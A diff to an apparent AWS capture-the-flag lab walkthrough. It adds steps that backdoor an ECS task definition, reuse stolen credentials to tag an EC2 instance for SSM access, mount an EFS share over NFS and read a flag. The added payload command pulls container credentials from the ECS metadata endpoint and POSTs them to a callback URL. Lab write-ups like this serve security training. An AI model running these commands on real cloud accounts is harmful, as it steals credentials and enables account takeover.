@@ -2241,8 +2241,89 @@ aws ecs register-task-definition --generate-cli-skeleton --profile ruse > task_t
   <img src="/images/cloud/register_task_definition.png">
 </p>
 
-* Use **task_def.json** to fill out **template.json** with the desired payload.
+* Use **task_def.json** to fill out **task_template.json** with the desired payload.
+
+```bash # Payload command
+/bin/sh -c \"curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json && curl -X POST -d @data.json {{CALLBACK URL}} \
+````
+<p align="center">
+  <img src="/images/cloud/task_template1.png">
+</p>
+
+* **Update** the ECS service.
+
+```bash
+aws ecs update-service --service <service_arn> --cluster <cluster_arn> --task-definition <backdoor_task>
+```
 
 <p align="center">
-  <img src="/images/cloud/.png">
+  <img src="/images/cloud/update_ecs_efs.png">
+</p>
+
+* Wait for the task to run and **POST** the credentials to your listener.
+
+<p align="center">
+  <img src="/images/cloud/post_credentials1.png">
+</p>
+
+* With the **new creds** add them to "ruse_box"
+
+```bash
+aws configure --profile ecs
+```
+
+<p align="center">
+  <img src="/images/cloud/aws_new_profile_ecs.png">
+</p>
+
+* Modify **Admin EC2 tags**.
+
+```bash
+aws ec2 create-tags --resources <INSTANCE ID> --tags Key=StartSession,Value=true
+```
+
+<p align="center">
+  <img src="/images/cloud/create_tags.png">
+</p>
+
+* Start a **session** on Admin EC2.
+
+```bash
+aws ssm start-session --target <INSTANCE ID> --profile ecs
+```
+
+<p align="center">
+  <img src="/images/cloud/ssm_user_login.png">
+</p>
+
+* Looking at the EC2 instances we see the Admin EC2 only has a **single port open**, we Nmap scan this port.
+
+```bash
+nmap -Pn -p 2049 --open 10.10.10.0/24
+```
+
+<p align="center">
+  <img src="/images/cloud/ssm_nmap.png">
+</p>
+
+* **Mount** discovered EC2.
+
+```bash
+cd /mnt
+sudo mkdir efs 
+sudo mount -t nfs -o nfsvers=4.1,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport {EFS_IP}:/ efs
+```
+
+<p align="center">
+  <img src="/images/cloud/mnt_efs.png">
+</p>
+
+* Read the **flag.txt** using the following command.
+
+```bash
+cat flag.txt
+```
+
+<p align="center">
+  <img src="/images/cloud/cat_ecs_efs_flag.png">
 </p>
